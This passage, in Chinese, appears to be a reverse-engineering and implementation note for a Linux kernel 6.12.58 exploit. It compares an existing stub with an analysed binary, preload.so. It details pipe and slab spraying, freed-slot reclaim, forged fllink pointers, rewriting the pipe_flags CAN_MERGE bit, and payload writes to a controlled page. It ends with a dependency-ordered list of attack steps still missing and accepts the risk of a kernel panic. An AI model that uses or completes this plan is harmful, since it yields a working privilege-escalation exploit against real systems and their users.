   §2.6 只差 `gen`/`refs`/`depth`/`refcount` 四项未验证。
3. 每个对象写入两处：`+0x1780`（值 = `page + 0x100`，逐个 `+0x800`）与
   `+0x1788`（值 = `uVar30 + lVar27 + 0x988`，首项为 0）。
   **这两个偏移落在 `0x800` 对象的什么字段仍未确认**（需按 `epitem`/`pipe_buffer`
   布局核对），列为批次 D 实测项。
4. `lVar27` 首项为 `-0x800` 时 `lVar3` 被置 0（`if (lVar27 != -0x80)` 特判），
   即**第 0 号对象的低项为 0**，其余为 `uVar30 + 偏移`。该特判的实际用意
   未确认，不建议臆测。

#### 2.11.1 基址稳定性已核对（`FUN_0022058c`）

喷洒循环内两次调用 `FUN_0022058c()` 取基址，若每次返回新分配，则 `+0x1780`
与 `+0x1788` 会落到不同对象，上面的「同一区域连续填充」解读就不成立。
实测其实现为（`annotated.c:4419`）：

```c
undefined8 FUN_0022058c(void) { return DAT_00268010; }   /* 单个全局指针 */
```

**每次返回同一个全局基址**，故解读成立：写入落在同一映射内。
据此可算出确切布局——`lVar27` 取 `-0x800 … -0x80`（步长 `0x80`，共 **16** 次），
故 16 组 8 字节对落在同一区域内的 `base+0xF80 … base+0x1708`，
跨度 `0x788`，步长 `0x80`（每槽 128 字节，仅用低 16 字节）。
即：**一张 16 项指针表**，第 `i` 项写入
`{ page + 0x100 + i*0x800, uVar30 + 偏移 }`。

> `DAT_00268010` 指向区域的**总大小与该表在其中的基址**未确认；
> 上述偏移均为相对 `DAT_00268010` 的相对量。批次 D 需实测确认后再硬编码。

## 3. 真实机制（综合 §2）

1. **取地址**：`direct_map_base` + `selinux_image_off` → `direct_map_alias=0xffffff80027c6960`，
   **来自 profile 预设**（`address_source=target_profile`），不在运行时验证
   （`runtime_address_verified=0 panic_possible=1` —— 明确接受 panic 风险）。
2. **形状校验**：`phase=collision_shape pre=24 post=25`（碰撞计数恰好 +1）。
3. **准备诱饵**：`late_refs{decoy_unlink, fd_preflight}` —— 先建诱饵对象再 unlink。
4. **抢槽位**：`RECLAIM_HIT` 两模式，`generation`/`outer_depth`/`can_merge` 判定。
5. **伪造链接**：`KNOWN_PAGE base=... fake_fllink=...`；`pipe_flags`（偏移 `0x18`）改写
   即 `pipe_flags_redirect` / `pipe_flags_candidate`，日志里的 `bit4` 即 `pipe_flags` 的 bit4。
6. **写入**：`pipe_worker` 的 `payload_writes` 打到 `controlled_page`
   （`PROBE_TARGET controlled_page=... write_window=[lo,hi] depth_sentinel=0x%02x`）。
7. **独立验证**（非自读回）：
   `PROBE_READBACK ... generation=... refs=... depth=... refcount=... expected_written=%d pass=%d`
   以及经 carrier 的 `carrier_readback`。

## 4. 与 stub 的差距

| 环节 | stub | `preload.so` |
|---|---|---|
| 几何常量 | 仅 `pr_info` 打印（`fd_graph_route.cpp:150-155`） | 参与构造；且**另有 4 个 profile 缺失字段**（见 §5） |
| 碰撞页 | `reinterpret_cast<uint64_t>(ks->collisions)`（计数当地址，仅日志） | `collision_shape pre/post` 校验 +1 |
| 诱饵 | 无 | `decoy_unlink` + `fd_preflight` |
| 抢槽 | 无 `active_slot` 选取 | `RECLAIM_HIT mode=pipe/zero` |
| `fllink` | 无 | `fake_fllink = base \| 0x108`（§2.8，`LIST_POISON1 + 8`） |
| `pipe_flags` | 无（只打印偏移 0x18） | `pipe_flags_redirect` 改写 bit4（`CAN_MERGE`，§2.6.1） |
| **fd 表** | `map_anonymous(0x780)` + `memset 0xff`，槽初值 **0** | `malloc(0x780)` + `memset 0xff`，槽初值 **`-1`**（空槽标记，§2.10） |
| **建管道** | **完全没有** | 每槽一根，共 **240** 根（`FUN_00235e44`，§2.10） |
| **缩放管环** | **完全没有** | `F_SETPIPE_SZ` 8KiB/128KiB 两级 + `F_GETPIPE_SZ` 回读（§2.7） |
| 写入 | `splice(..., static_cast<int>(target), ...)` ← 内核地址当 fd，必然 `EBADF` | **240 路 `write(fd_table[i], payload, len)`**，每次须返回全长；命令字 `'W'` 门控（§2.9） |
| 回读 | 无 | `pread64` **按槽位偏移**校验 + `PIPE_OBSERVED`（§2.9） |
| 时序 | **已有**扫描 `{0,1,2,4,8,12,20,32,48,64}`（`fd_graph_route.cpp:248`），但每个 delay 只试 1 次 | 同序列，且每档多次重试 + `tries`/`duration` 统计 |
| 计数 | `reclaim_hits++` 在 `sp==8` 判断**之外**（`:277`），实际统计的是「vmsplice 返回 8」，与 `preload.so` 的 `RECLAIM_HIT` 语义不同名 | `RECLAIM_HIT` 记录 `generation`/`outer_depth`/`can_merge`/`duration_ns` |
| 验证 | `*verify == value`（自读回） | `generation`/`refs`/`depth`/`refcount`/`carrier_readback` 独立哨兵 |

## 5. profile 缺失的 4 个几何字段（新增发现）

`preload.so` 的几何串含 `gen=0xa8 refs=0xb0 depth=0xb8 refcount=0xbc`，
其 `PROBE_READBACK` 依赖 `refs`/`depth`/`refcount` 做独立验证。
当前 `6.12.58` profile **没有**这 4 项（`epitem_ep=0x48`、`epitem_fllink=0x50` 已正确）。
若要移植验证逻辑，需**扩展 profile 几何字段** —— 属 L 级 wire/profile 格式变更，
须先出计划并同步 native `profile/binary.cpp` 与 Kotlin `FdGraphConfig`（键名逐字一致）。

## 6. 缺失清单（按依赖顺序）

已被 §2.7–§2.10 **确认取值**的项标注 ✅（实现时按该处描述照做，无需再取证）：

1. `late_refs`：诱饵 unlink + fd preflight。
2. 活跃槽位选取与 `RECLAIM_HIT` 两模式判定。
3. ✅ `fake_fllink` 构造（§2.8：`base | 0x108`）；
   ⚠️ `pipe_flags`(0x18) 的 `CAN_MERGE` 写入点仍未定位，改为实现期实测。
4. ✅ `resize_sample` 语义（§2.7：`F_SETPIPE_SZ` 8K/128K + 回读，**失败即 `exit(-1)`**）。
5. ✅ fd 表 + 建管道（§2.10：`malloc(0x780)`、240 槽步长 8、**空槽初值 `-1`**、
   每槽一根管道）。
6. ✅ `payload_writes` 投递（§2.9：命令字 `'W'` 门控、240 路 `write` 须返回全长、
   `pread64` 按槽位偏移回读）。
7. `pipe_worker` 线程模型（持槽 + 与主线程的握手；§2.5.3 的自旋点）。
8. 每档 delay 的**多次重试与统计**（stub 每档只试 1 次，且 `RACE_SUMMARY` 未记录 `delay_us`，
   无法定位命中档位）。
9. 独立验证（哨兵 + carrier readback），替换自读回。
10. 撤销 stub 中把内核地址当 fd 的 `splice()` 调用（该调用恒 `EBADF`）。
11. ⚠️ **沿用 `-1` 空槽语义**（§2.10.1）：stub 现写 `0`，会把 fd 0（stdin）当有效管道。

## 7. 下一步

L 级改动（攻击关键路径），按 `AGENTS.md` 需先出计划文档并获认可再动代码。

1. 反汇编 `0x2205a8..0x22264c`（含 `RACE_SUMMARY` / `RECLAIM_HIT` 格式串的函数）
   与 `pipe_worker` / `redirect` 处理函数，把 §2.3 的推断升级为指令级事实。
2. 据此产出实施计划，含所有权/生命周期审查（需在管道槽与 slab 对象间建立新持有关系）。
3. 实现后重跑门禁；**必须冷启动**，且按 `AGENTS.md` 需同构建复现来判定因果。

在第 1 步完成前不要改动 `fd_graph_route.cpp`：现有 `prepare/execute/disarm/destroy`
形状与 12 个常量是重写时的对照基准。